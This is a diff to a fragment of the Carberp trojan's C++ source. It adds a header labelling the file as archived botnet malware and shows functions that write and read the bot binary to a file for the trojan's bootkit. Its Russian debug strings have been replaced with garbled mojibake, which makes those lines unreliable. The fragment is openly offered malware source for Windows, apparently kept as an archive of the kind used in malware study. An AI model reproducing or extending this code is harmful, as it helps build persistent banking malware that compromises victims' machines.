@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "BootkitCrypt.h"
 #include "GetApi.h"
 #include "crypt.h"
@@ -30,7 +41,7 @@ bool WriteBotForBootkit( BYTE* data, DWORD c_data )
 	char fileName[MAX_PATH];
 	if( NameFileForBootkit( fileName, sizeof(fileName) ) )
 	{
-		PP_DPRINTF( "Файл куда записали бот: %s", fileName );
+		PP_DPRINTF( "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ: %s", fileName );
 		if( File::WriteBufferA( fileName, data, c_data ) == c_data )
 			return true;
 	}
@@ -42,7 +53,7 @@ BYTE* ReadBotForBootkit( DWORD& size )
 	char fileName[MAX_PATH];
 	if( NameFileForBootkit( fileName, sizeof(fileName) ) )
 	{
-		PP_DPRINTF( "Файл с которого считываем бот: %s", fileName );
+		PP_DPRINTF( "пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ: %s", fileName );
 		if( File::IsExists(fileName) )
 		{
 			BYTE* data = File::ReadToBufferA( fileName, size );
@@ -50,7 +61,7 @@ BYTE* ReadBotForBootkit( DWORD& size )
 			return data;
 		}
 		else
-			PP_DPRINTF( "Файл %s не существует", fileName );
+			PP_DPRINTF( "пїЅпїЅпїЅпїЅ %s пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", fileName );
 	}
 	return 0;
 }
